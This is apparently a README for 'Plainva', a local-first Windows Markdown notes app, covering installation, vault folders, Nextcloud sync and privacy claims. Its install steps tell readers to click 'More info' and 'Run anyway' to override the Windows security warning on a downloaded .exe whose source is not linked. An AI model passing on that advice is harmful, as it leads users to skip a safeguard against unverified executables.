📝 plainva - Edit your Markdown notes locally

Download Plainva for Windows

Plainva helps you manage your digital notes. You keep full control over your files while you organize your knowledge. The software works with plain Markdown text. You can store your files on your computer or sync them with cloud services like Nextcloud.

🧠 Why use Plainva?

Your notes belong to you. Most apps lock your data inside proprietary systems. Plainva uses simple text files. This means your notes remain readable even if you decide to stop using the application. You can move, copy, or edit your files with any other text tool at any time.

The application supports local-first storage. Your data lives on your device. You do not need a constant internet connection to open or modify your vault. Privacy remains the priority, ensuring your thoughts stay private and secure.

🚀 Getting Started

Follow these steps to set up the software on your Windows computer.

  1. Visit the download page: Go to the official release page.
  2. Choose your file: Look for the file ending in .exe. Click the file name to download it to your computer.
  3. Run the installer: Open your Downloads folder and double-click the file you just downloaded. Windows may show a security window. Click "More info" and then "Run anyway" if the system asks for your permission to open the file.
  4. Follow the prompts: The installer will guide you through the setup process. Follow the instructions on your screen.
  5. Open the application: Once the installation finishes, you can open Plainva from your desktop or start menu.

📂 Using your Vault

When you open Plainva, it asks you to select a folder on your computer. This folder acts as your vault. Any Markdown files inside this folder will appear in the editor window. If you use cloud storage sync, such as a synced Nextcloud folder, you can select that folder to edit your notes across multiple devices.

⚙️ System Requirements

  • Windows 10 or 11
  • Current version of the Windows operating system
  • Hard drive space for your notes

🛡️ Privacy and Safety

Plainva does not send your data to external servers. Your notes stay on your local disk. Because the software uses standard Markdown and SQLite databases, you can back up your data just by copying your vault folder to an external hard drive or another secure location.
